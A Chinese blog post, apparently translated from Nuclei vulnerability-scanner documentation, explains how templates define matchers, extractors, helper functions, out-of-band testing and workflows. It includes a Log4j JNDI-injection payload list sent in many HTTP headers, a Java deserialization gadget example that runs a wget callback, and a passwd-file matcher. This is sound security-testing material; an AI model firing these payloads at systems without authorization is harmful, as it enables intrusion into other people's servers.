> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [blog.csdn.net](https://blog.csdn.net/qq_41315957/article/details/126594670)

#### 匹配器

匹配器允许对协议响应进行不同类型的灵活比较。非常易于编写，并且可以根据需要添加多个检查以实现非常有效的扫描。

##### 类型

可以在请求中指定多个匹配器。基本上有 6 种类型的匹配器：

<table><thead><tr><th>Matcher Type</th><th>Part Matched</th></tr></thead><tbody><tr><td>status</td><td>Integer Comparisons of Part</td></tr><tr><td>size</td><td>Content Length of Part</td></tr><tr><td>word</td><td>Part for a protocol</td></tr><tr><td>regex</td><td>Part for a protocol</td></tr><tr><td>binary</td><td>Part for a protocol</td></tr><tr><td>dsl</td><td>Part for a protocol</td></tr></tbody></table>

要匹配响应的状态代码，您可以使用以下语法。

```
matchers:
  # Match the status codes
  - type: status
    # Some status codes we want to match
    status:
      - 200
      - 302
```

要为十六进制响应匹配二进制，您可以使用以下语法。

```
matchers:
  - type: binary
    binary:
      - "504B0304" # zip archive
      - "526172211A070100" # RAR archive version 5.0
      - "FD377A585A0000" # xz tar.xz archive
    condition: or
    part: body
```

匹配器还支持将被解码和匹配的十六进制编码数据。

```
matchers:
  - type: word
    encoding: hex
    words:
      - "50494e47"
    part: body
```

可以根据用户的需要进一步配置 Word 和 **Regex 匹配器。**

**dsl** 类型的复杂匹配器允许使用辅助函数构建更复杂的表达式。这些功能允许访问包含基于每个协议的各种数据的协议响应。请参阅协议特定文档以了解不同的返回结果。

```
matchers:
  - type: dsl
    dsl:
      - "len(body)<1024 && status_code==200" # Body length less than 1024 and 200 status code
      - "contains(toupper(body), md5(cookie))" # Check if the MD5 sum of cookies is contained in the uppercase body
```

<table><thead><tr><th>Response Part</th><th>Description</th><th>Example</th></tr></thead><tbody><tr><td>content_length</td><td>Content-Length Header</td><td>content_length &gt;= 1024</td></tr><tr><td>status_code</td><td>Response Status Code</td><td>status_code==200</td></tr><tr><td>all_headers</td><td>Unique string containing all headers</td><td>len(all_headers)</td></tr><tr><td>body</td><td>Body as string</td><td>len(body)</td></tr><tr><td>header_name</td><td>Lowercase header name with <code>-</code> converted to <code>_</code></td><td>len(user_agent)</td></tr><tr><td>raw</td><td>Headers + Response</td><td>len(raw)</td></tr></tbody></table>

##### 条件

可以在单个匹配器中指定多个单词和正则表达式，并且可以使用 **AND** 和 **OR** 等不同条件进行配置。

1.  **AND** - 使用 AND 条件允许匹配匹配器的单词列表中的所有单词。只有这样，当所有单词都匹配时，请求才会被标记为成功。
2.  **OR** - 使用 OR 条件允许匹配匹配器列表中的单个单词。当匹配器匹配到一个单词时，请求将被标记为成功。

##### 匹配部分

响应的多个部分也可以匹配请求，`body`如果未定义，则默认匹配部分。

使用 AND 条件的 HTTP 响应正文的示例匹配器：

```
matchers:
  # Match the body word
  - type: word
   # Some words we want to match
   words:
     - "[core]"
     - "[config]"
   # Both words must be found in the response body
   condition: and
   #  We want to match request body (default)
   part: body
```

##### 负匹配器

所有类型的匹配器也支持否定条件，这在查找具有排除项的匹配时非常有用。这可以通过添加 matchers 块来`negative: true`使用。

这是使用条件的示例语法`negative`，这将返回`PHPSESSID`响应标头中没有的所有 URL。

```
matchers:
  - type: word
    words:
      - "PHPSESSID"
    part: header
    negative: true
```

##### 多个匹配器

可以在单个模板中使用多个匹配器来识别单个请求的多个条件。

这是多个匹配器的语法示例。

```
matchers:
  - type: word
    name: php
    words:
      - "X-Powered-By: PHP"
      - "PHPSESSID"
    part: header
  - type: word
    name: node
    words:
      - "Server: NodeJS"
      - "X-Powered-By: nodejs"
    condition: or
    part: header
  - type: word
    name: python
    words:
      - "Python/2."
      - "Python/3."
    condition: or
    part: header
```

##### 匹配条件

使用多个匹配器时，默认条件是在所有匹配器之间进行 OR 操作，如果所有匹配器都返回 true，则可以使用 AND 操作确保返回结果。

```
matchers-condition: and
    matchers:
      - type: word
        words:
          - "X-Powered-By: PHP"
          - "PHPSESSID"
        condition: or
        part: header

      - type: word
        words:
          - "PHP"
        part: body
```

#### 提取器

提取器可用于从模块返回的响应中提取匹配项并将其显示在结果中。

##### 类型

可以在请求中指定多个提取器。截至目前，我们支持两种类型的提取器。

1.  **regex** - 根据正则表达式从响应中提取数据。
2.  **kval** - 从响应标头 / Cookie 中提取`key: value`/`key=value`格式化数据
3.  **json** - 从基于 JSON 的响应中提取数据，使用类似 JQ 的语法。
4.  **xpath** - 从 HTML 响应中提取基于 xpath 的数据
5.  **dsl** - 根据 DSL 表达式从响应中提取数据。

##### 正则表达式提取器

**使用正则表达式**的 HTTP 响应正文的示例提取器 -

```
extractors:
  - type: regex # type of the extractor
    part: body  # part of the response (header,body,all)
    regex:
      - "(A3T[A-Z0-9]|AKIA|AGPA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}"  # regex to use for extraction.
```

##### Kval 提取器

从 HTTP 响应中提取标头的 **kval** 提取器示例。`content-type`

```
extractors:
      - type: kval  # type of the extractor
        kval:
          - content_type  # header/cookie value to extract from response
```

请注意，`content-type`已替换为，`content_type`因为 **kval** 提取器不接受破折号 ( `-`) 作为输入，必须替换为下划线 ( `_`)。

##### JSON 提取器

一个 **json** 提取器示例，用于`id`从 JSON 块中提取对象的值。

```
- type: json # type of the extractor
        part: body
        name: user
        json:
          - '.[] | .id'  # JQ like syntax for extraction
```

有关 [JQ](https://so.csdn.net/so/search?q=JQ&spm=1001.2101.3001.7020) 的更多详细信息 - [https://github.com/stedolan/jq](https://github.com/stedolan/jq)

##### Xpath 提取器

从 HTML 响应中提取属性值的 **xpath** 提取器示例。`href`

```
extractors:
      - type: xpath # type of the extractor
        attribute: href # attribute value to extract (optional)
        xpath:
          - "/html/body/div/p[2]/a"  # xpath value for extraction
```

通过在浏览器中进行简单的[复制粘贴](https://www.scientecheasy.com/2020/07/find-xpath-chrome.html/)，我们可以从任何网页内容中获取 **xpath 值。**

##### [DSL](https://so.csdn.net/so/search?q=DSL&spm=1001.2101.3001.7020) 提取器

一个 **dsl** 提取器示例，用于通过 HTTP 响应中的辅助函数提取有效`body`长度。`len`

```
extractors:
      - type: dsl  # type of the extractor
        dsl:
          - "len(body)"  # dsl expression value to extract from response
```

##### 动态提取器

在编写多请求模板时，提取器可用于在运行时捕获动态值。CSRF Tokens、Session Headers 等可以被提取并在请求中使用。此功能仅适用于 RAW 请求格式。

使用名称定义动态提取器的示例，该提取器`api`将从请求中捕获基于正则表达式的模式。

```
extractors:
      - type: regex
        name: api
        part: body
        internal: true # Required for using dynamic variables
        regex:
          - "(?m)[0-9]{3,10}\\.[0-9]+"
```

提取的值存储在变量 **api** 中，可以在后续请求的任何部分中使用。

如果要将提取器用作动态变量，则必须使用`internal: true`以避免在终端中打印提取的值。

还可以为正则表达式指定可选的正则表达式**匹配组以进行更复杂的匹配。**

```
extractors:
  - type: regex  # type of extractor
    name: csrf_token # defining the variable name
    part: body # part of response to look for
    # group defines the matching group being used. 
    # In GO the "match" is the full array of all matches and submatches 
    # match[0] is the full match
    # match[n] is the submatches. Most often we'd want match[1] as depicted below
    group: 1
    regex:
      - '<input\s\stype="hidden"\svalue="([[:alnum:]]{16})"\s/>'
```

上面带有名称的提取器`csrf_token`将保存由`([[:alnum:]]{16})`as 提取的值`abcdefgh12345678`。

如果此正则表达式未提供组选项，则上述名称提取器`csrf_html_tag`将完整匹配（by `<input \stype="hidden"\svalue="([[:alnum:]]{16})" />`）作为`<input />`.

#### OOB 测试

自 [Nuclei v2.3.6](https://github.com/projectdiscovery/nuclei/releases/tag/v2.3.6) 发布以来，Nuclei 支持使用 [interact.sh](https://github.com/projectdiscovery/interactsh) API 来实现基于 OOB 的漏洞扫描，并内置了自动请求关联。就像`{{interactsh-url}}` 在请求中的任何地方编写一样简单，并为`interact_protocol`. Nuclei 将处理交互与模板的相关性以及它通过允许轻松的 OOB 扫描而生成的请求。

##### Interactsh 占位符

`{{interactsh-url}}`**http** 和**网络**请求中支持占位符。

`{{interactsh-url}}`下面提供了一个带有占位符的核请求示例。这些在运行时被替换为唯一的 interact.sh URL。

```
- raw:
      - |
        GET /plugins/servlet/oauth/users/icon-uri?consumerUri=https://{{interactsh-url}} HTTP/1.1
        Host: {{Hostname}}
```

##### Interactsh 匹配器

Interactsh 交互可以与`word`，`regex`或`dsl`使用以下部分的匹配器 / 提取器一起使用。

<table><thead><tr><th>part</th></tr></thead><tbody><tr><td>interactsh_protocol</td></tr><tr><td>interactsh_request</td></tr><tr><td>interactsh_response</td></tr></tbody></table>

###### interactsh_protocol

值可以是 dns、http 或 smtp。这是每个基于 interactsh 的模板的标准匹配器，dns 通常是通用值，因为它本质上是非侵入性的。

###### interactsh_request

interact.sh 服务器收到的请求。

###### interactsh_response

interact.sh 服务器发送给客户端的响应。

Interactsh DNS 交互匹配器示例：

```
matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"
```

交互内容上的 HTTP 交互匹配器 + 单词匹配器示例

```
matchers-condition: and
matchers:
    - type: word
      part: interactsh_protocol # Confirms the HTTP Interaction
      words:
        - "http"

    - type: regex
      part: interactsh_request # Confirms the retrieval of etc/passwd file
      regex:
        - "root:[x*]:0:0:"
```

之前在 github 找的一个 log4j2 扫描模板就用到了这个。

```
id: log4j-fuzz-head-poc

info:
  name: log4j-rce漏洞
  author: xxx
  severity: critical
  tags: apache,rce

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        {{log4j_payloads}}

      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        {{log4j_payloads}}
    payloads:
      log4j_payloads:
        - 'X-Client-IP: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'X-Remote-IP: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'X-Remote-Addr: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'X-Forwarded-For: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'X-Originating-IP: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'User-Agent: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'Referer: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'CF-Connecting_IP: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'True-Client-IP: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'X-Forwarded-For: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'Originating-IP: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'X-Real-IP: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'X-Client-IP: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'Forwarded: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'Client-IP: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'Contact: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'X-Wap-Profile: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'X-Api-Version: ${jndi:ldap://{{interactsh-url}}/info}'
        - 'Host: ${jndi:ldap://{{interactsh-url}}/info}'
            
    attack: clusterbomb
    matchers-condition: or
    matchers:
      - type: word
        part: interactsh_protocol
        name: http
        words:
          - "http"

      - type: word
        part: interactsh_protocol
        name: dns
        words:
          - "dns"
```

#### 辅助函数

##### 辅助函数

以下是可在 RAW 请求 / 网络请求中使用的所有支持的辅助函数的列表。

太多了记不住，cv 一下。。。

<table><thead><tr><th>Helper function</th><th>Description</th><th>Example</th><th>Output</th></tr></thead><tbody><tr><td>base64(src interface{}) string</td><td>Base64 对字符串进行编码</td><td><code>base64("Hello")</code></td><td><code>SGVsbG8=</code></td></tr><tr><td>base64_decode(src interface{}) []byte</td><td>Base64 对字符串进行解码</td><td><code>base64_decode("SGVsbG8=")</code></td><td><code>Hello</code></td></tr><tr><td>base64_py(src interface{}) string</td><td>像 python 一样将字符串编码为 base64（带有新行）</td><td><code>base64_py("Hello")</code></td><td><code>SGVsbG8=</code></td></tr><tr><td>concat(arguments …interface{}) string</td><td>连接给定数量的参数以形成一个字符串</td><td><code>concat("Hello", 123, "world)</code></td><td><code>Hello123world</code></td></tr><tr><td>compare_versions(versionToCheck string, constraints …string) bool</td><td>将第一个版本参数与提供的约束进行比较</td><td><code>compare_versions('v1.0.0', '&gt;v0.0.1', '&lt;v1.0.1')</code></td><td><code>true</code></td></tr><tr><td>contains(input, substring interface{}) bool</td><td>验证字符串是否包含子字符串</td><td><code>contains("Hello", "lo")</code></td><td><code>true</code></td></tr><tr><td>generate_java_gadget(gadget, cmd, encoding interface{}) string</td><td>生成 Java 反序列化小工具</td><td><code>generate_java_gadget("dns", "{{interactsh-url}}", "base64")</code></td><td><code>rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAAHQAAHEAfgAFdAAFcHh0ACpjYWhnMmZiaW41NjRvMGJ0MHRzMDhycDdlZXBwYjkxNDUub2FzdC5mdW54</code></td></tr><tr><td>gzip(input string) string</td><td>使用 GZip 压缩输入</td><td><code>gzip("Hello")</code></td><td></td></tr><tr><td>gzip_decode(input string) string</td><td>使用 GZip 解压缩输入</td><td><code>gzip_decode(hex_decode("1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000"))</code></td><td><code>Hello</code></td></tr><tr><td>zlib(input string) string</td><td>使用 Zlib 压缩输入</td><td><code>base64(zlib("Hello"))</code></td><td><code>eJzySM3JyQcEAAD//wWMAfU=</code></td></tr><tr><td>zlib_decode(input string) string</td><td>使用 Zlib 解压缩输入</td><td><code>zlib_decode(hex_decode("789cf248cdc9c907040000ffff058c01f5"))</code></td><td><code>Hello</code></td></tr><tr><td>hex_decode(input interface{}) []byte</td><td>十六进制解码给定的输入</td><td><code>hex_decode("6161")</code></td><td><code>aa</code></td></tr><tr><td>hex_encode(input interface{}) string</td><td>十六进制编码给定的输入</td><td><code>hex_encode("aa")</code></td><td><code>6161</code></td></tr><tr><td>html_escape(input interface{}) string</td><td>HTML 转义给定的输入</td><td><code>html_escape("&lt;body&gt;test&lt;/body&gt;")</code></td><td><code>&amp;lt;body&amp;gt;test&amp;lt;/body&amp;gt;</code></td></tr><tr><td>html_unescape(input interface{}) string</td><td>HTML 取消转义给定的输入</td><td><code>html_unescape("&amp;lt;body&amp;gt;test&amp;lt;/body&amp;gt;")</code></td><td><code>&lt;body&gt;test&lt;/body&gt;</code></td></tr><tr><td>len(arg interface{}) int</td><td>返回输入的长度</td><td><code>len("Hello")</code></td><td><code>5</code></td></tr><tr><td>md5(input interface{}) string</td><td>计算输入的 MD5（消息摘要）哈希</td><td><code>md5("Hello")</code></td><td><code>8b1a9953c4611296a827abf8c47804d7</code></td></tr><tr><td>mmh3(input interface{}) string</td><td>计算输入的 MMH3 (MurmurHash3) 哈希</td><td><code>mmh3("Hello")</code></td><td><code>316307400</code></td></tr><tr><td>print_debug(args …interface{})</td><td>打印给定输入或表达式的值。用于调试。</td><td><code>print_debug(1+2, "Hello")</code></td><td><code>3 Hello</code></td></tr><tr><td>rand_base(length uint, optionalCharSet string) string</td><td>从可选字符集生成给定长度字符串的随机序列（默认为字母和数字）</td><td><code>rand_base(5, "abc")</code></td><td><code>caccb</code></td></tr><tr><td>rand_char(optionalCharSet string) string</td><td>从可选字符集中生成随机字符（默认为字母和数字）</td><td><code>rand_char("abc")</code></td><td><code>a</code></td></tr><tr><td>rand_int(optionalMin, optionalMax uint) int</td><td>在给定的可选限制之间生成一个随机整数（默认为 0 - MaxInt32）</td><td><code>rand_int(1, 10)</code></td><td><code>6</code></td></tr><tr><td>rand_text_alpha(length uint, optionalBadChars string) string</td><td>生成给定长度的随机字母字符串，不包括可选的割集字符</td><td><code>rand_text_alpha(10, "abc")</code></td><td><code>WKozhjJWlJ</code></td></tr><tr><td>rand_text_alphanumeric(length uint, optionalBadChars string) string</td><td>生成一个给定长度的随机字母数字字符串，没有可选的割集字符</td><td><code>rand_text_alphanumeric(10, "ab12")</code></td><td><code>NthI0IiY8r</code></td></tr><tr><td>rand_text_numeric(length uint, optionalBadNumbers string) string</td><td>生成给定长度的随机数字字符串，没有可选的不需要的数字集</td><td><code>rand_text_numeric(10, 123)</code></td><td><code>0654087985</code></td></tr><tr><td>regex(pattern, input string) bool</td><td>针对输入字符串测试给定的正则表达式</td><td><code>regex("H([a-z]+)o", "Hello")</code></td><td><code>true</code></td></tr><tr><td>remove_bad_chars(input, cutset interface{}) string</td><td>从输入中删除所需的字符</td><td><code>remove_bad_chars("abcd", "bc")</code></td><td><code>ad</code></td></tr><tr><td>repeat(str string, count uint) string</td><td>重复输入字符串给定的次数</td><td><code>repeat("../", 5)</code></td><td><code>../../../../../</code></td></tr><tr><td>replace(str, old, new string) string</td><td>替换给定输入中的给定子字符串</td><td><code>replace("Hello", "He", "Ha")</code></td><td><code>Hallo</code></td></tr><tr><td>replace_regex(source, regex, replacement string) string</td><td>替换与输入中给定正则表达式匹配的子字符串</td><td><code>replace_regex("He123llo", "(\\d+)", "")</code></td><td><code>Hello</code></td></tr><tr><td>reverse(input string) string</td><td>反转给定的输入</td><td><code>reverse("abc")</code></td><td><code>cba</code></td></tr><tr><td>sha1(input interface{}) string</td><td>计算输入的 SHA1（安全哈希 1）哈希</td><td><code>sha1("Hello")</code></td><td><code>f7ff9e8b7bb2e09b70935a5d785e0cc5d9d0abf0</code></td></tr><tr><td>sha256(input interface{}) string</td><td>计算输入的 SHA256（安全哈希 256）哈希</td><td><code>sha256("Hello")</code></td><td><code>185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969</code></td></tr><tr><td>to_lower(input string) string</td><td>将输入转换为小写字符</td><td><code>to_lower("HELLO")</code></td><td><code>hello</code></td></tr><tr><td>to_upper(input string) string</td><td>将输入转换为大写字符</td><td><code>to_upper("hello")</code></td><td><code>HELLO</code></td></tr><tr><td>trim(input, cutset string) string</td><td>返回一个输入切片，其中包含在 cutset 中的所有前导和尾随 Unicode 代码点都已删除</td><td><code>trim("aaaHelloddd", "ad")</code></td><td><code>Hello</code></td></tr><tr><td>trim_left(input, cutset string) string</td><td>返回一个输入切片，其中包含在 cutset 中的所有前导 Unicode 代码点都已删除</td><td><code>trim_left("aaaHelloddd", "ad")</code></td><td><code>Helloddd</code></td></tr><tr><td>trim_prefix(input, prefix string) string</td><td>返回没有提供的前导前缀字符串的输入</td><td><code>trim_prefix("aaHelloaa", "aa")</code></td><td><code>Helloaa</code></td></tr><tr><td>trim_right(input, cutset string) string</td><td>返回一个字符串，其中包含在 cutset 中的所有尾随 Unicode 代码点都已删除</td><td><code>trim_right("aaaHelloddd", "ad")</code></td><td><code>aaaHello</code></td></tr><tr><td>trim_space(input string) string</td><td>返回一个字符串，删除所有前导和尾随空格，由 Unicode 定义</td><td><code>trim_space(" Hello ")</code></td><td><code>"Hello"</code></td></tr><tr><td>trim_suffix(input, suffix string) string</td><td>返回没有提供的尾随后缀字符串的输入</td><td><code>trim_suffix("aaHelloaa", "aa")</code></td><td><code>aaHello</code></td></tr><tr><td>unix_time(optionalSeconds uint) float64</td><td>返回当前 Unix 时间（自 1970 年 1 月 1 日 UTC 以来经过的秒数）以及添加的可选秒数</td><td><code>unix_time(10)</code></td><td><code>1639568278</code></td></tr><tr><td>url_decode(input string) string</td><td>URL 解码输入字符串</td><td><code>url_decode("https:%2F%2Fprojectdiscovery.io%3Ftest=1")</code></td><td><code>https://projectdiscovery.io?test=1</code></td></tr><tr><td>url_encode(input string) string</td><td>URL 对输入字符串进行编码</td><td><code>url_encode("https://projectdiscovery.io/test?a=1")</code></td><td><code>https%3A%2F%2Fprojectdiscovery.io%2Ftest%3Fa%3D1</code></td></tr><tr><td>wait_for(seconds uint)</td><td>暂停执行给定的秒数</td><td><code>wait_for(10)</code></td><td><code>true</code></td></tr><tr><td>join(separator string, elements …interface{}) string)</td><td>暂停执行给定的秒数</td><td><code>join("_", 123, "hello", "world")</code></td><td><code>123_hello_world</code></td></tr><tr><td>hmac(algorithm, data, secret)</td><td>hmac 函数，接受带有数据和秘密的散列函数类型</td><td><code>hmac("sha1", "test", "scrt")</code></td><td><code>8856b111056d946d5c6c92a21b43c233596623c6</code></td></tr><tr><td>date_time(dateTimeFormat)</td><td>以 go 风格的日期时间格式返回日期或时间</td><td><code>date_time("%Y-%M-%D %H:%m")</code></td><td><code>2022-06-10 14:18</code></td></tr></tbody></table>

##### 反序列化辅助函数

[Nuclei 允许从 ysoserial](https://github.com/frohoff/ysoserial) 为一些常见的小工具生成有效负载。

**支持的有效载荷：**

*   `dns`(URLDNS)
*   `commons-collections3.1`
*   `commons-collections4.0`
*   `jdk7u21`
*   `jdk8u20`
*   `groovy1`

**支持的编码：**

*   `base64`（默认）
*   `gzip-base64`
*   `gzip`
*   `hex`
*   `raw`

**反序列化辅助函数格式：**

```
{{generate_java_gadget(payload, cmd, encoding}}
```

**反序列化辅助函数示例：**

```
{{generate_java_gadget("commons-collections3.1", "wget http://{{interactsh-url}}", "
```

#### 变量

变量可用于声明一些在整个模板中保持不变的值。变量的值一旦计算就不会改变。变量可以是简单的字符串或 DSL 辅助函数。如果变量是辅助函数，则用双花括号括起来`{{<expression>}}`。变量在模板级别声明。

示例变量 -

```
variables:
  a1: "test" # A string variable
  a2: "{{to_lower(rand_base(5))}}" # A DSL function variable
```

目前，dns、http、headless 和网络协议支持变量。

带有变量的模板示例 -

```
# Variable example using HTTP requests
id: variables-example

info:
  name: Variables Example
  author: pdteam
  severity: info

variables:
  a1: "value"
  a2: "{{base64('hello')}}"

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{FQDN}}
        Test: {{a1}}
        Another: {{a2}}
    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: word
        words: 
          - "value"
          - "aGVsbG8="
```

```
# Variable example for network requests
id: variables-example

info:
  name: Variables Example
  author: pdteam
  severity: info

variables:
  a1: "PING"
  a2: "{{base64('hello')}}"

network:
  - host: 
      - "{{Hostname}}"
    inputs:
      - data: "{{a1}}"
    read-size: 8
    matchers:
      - type: word
        part: data
        words:
          - "{{a2}}"
```

#### 模板**预处理器**

某些预处理器可以在模板中的任何位置全局指定，一旦加载模板就会运行，以实现为每个模板运行生成的随机 id 之类的东西。

##### randstr

信息

在每次核运行时为模板生成一个[随机 ID](https://github.com/rs/xid)。这可以在模板中的任何地方使用，并且始终包含相同的值。`randstr`可以以数字为后缀，并且也会为这些名称创建新的随机 ID。前任。`{{randstr_1}}`这将在整个模板中保持不变。

`randstr`在匹配器中也支持，可用于匹配输入。

例如：-

```
requests:
  - method: POST
    path:
      - "{{BaseURL}}/level1/application/"
    headers:
      cmd: echo '{{randstr}}'

    matchers:
      - type: word
        words:
          - '{{randstr}}'
```

#### 工作流程

工作流允许用户定义模板的执行顺序。模板将在定义的条件下运行。这些是使用核的最有效方式，其中所有模板都根据用户的需要进行配置。这意味着，您可以创建基于技术 / 基于目标的工作流，例如 WordPress 工作流、Jira 工作流，它们仅在检测到特定技术时运行。

如果技术堆栈已知，我们建议您创建自定义工作流程来运行扫描。这导致扫描时间更短，结果更好。

可以使用`workflows`属性定义工作流，在`template`/`subtemplates`之后`tags`执行。

```
workflows:
  - template: technologies/template-to-execute.yaml
```

**工作流类型**

1.  通用工作流程
2.  条件工作流

##### 通用工作流程

在通用工作流中，可以定义要从单个工作流文件执行的单个或多个模板。它支持文件和目录作为输入。

在给定 URL 列表上运行所有与配置相关的模板的工作流。

```
workflows:
  - template: files/git-config.yaml
  - template: files/svn-config.yaml
  - template: files/env-file.yaml
  - template: files/backup-files.yaml
  - tags: xss,ssrf,cve,lfi
```

运行为您的项目定义的特定检查列表的工作流。

```
workflows:
  - template: cves/
  - template: exposed-tokens/
  - template: exposures/
  - tags: exposures
```

##### 条件工作流

您还可以创建条件模板，这些模板在匹配上一个模板的条件后执行。这对于漏洞检测和利用以及基于技术的检测和利用非常有用。这种工作流程的用例是广泛而多样的。

**基于模板的条件检查**

当基本模板匹配时执行子模板的工作流。

```
workflows:
  - template: technologies/jira-detect.yaml
    subtemplates:
      - tags: jira
      - template: exploits/jira/
```

**基于匹配器名称的条件检查**

当在结果中找到基本模板的匹配器时执行子模板的工作流。

```
workflows:
  - template: technologies/tech-detect.yaml
    matchers:
      - name: vbulletin
        subtemplates:
          - template: exploits/vbulletin-exp1.yaml
          - template: exploits/vbulletin-exp2.yaml
      - name: jboss
        subtemplates:
          - template: exploits/jboss-exp1.yaml
          - template: exploits/jboss-exp2.yaml
```

以类似的方式，可以根据需要为工作流创建尽可能多的嵌套检查。

**基于子模板和匹配器名称的多级条件检查**

一个展示模板执行链的工作流，仅当先前的模板匹配时才运行。

```
workflows:
  - template: technologies/tech-detect.yaml
    matchers:
      - name: lotus-domino
        subtemplates:
          - template: technologies/lotus-domino-version.yaml
            subtemplates:
              - template: cves/xx-yy-zz.yaml
                subtemplates:
                  - template: cves/xx-xx-xx.yaml
```

条件工作流是以最有效的方式执行检查和漏洞检测的绝佳示例，而不是在所有目标上喷洒所有模板，并且通常会在您的时间上带来良好的投资回报率，并且对目标扫描动静也能小很多。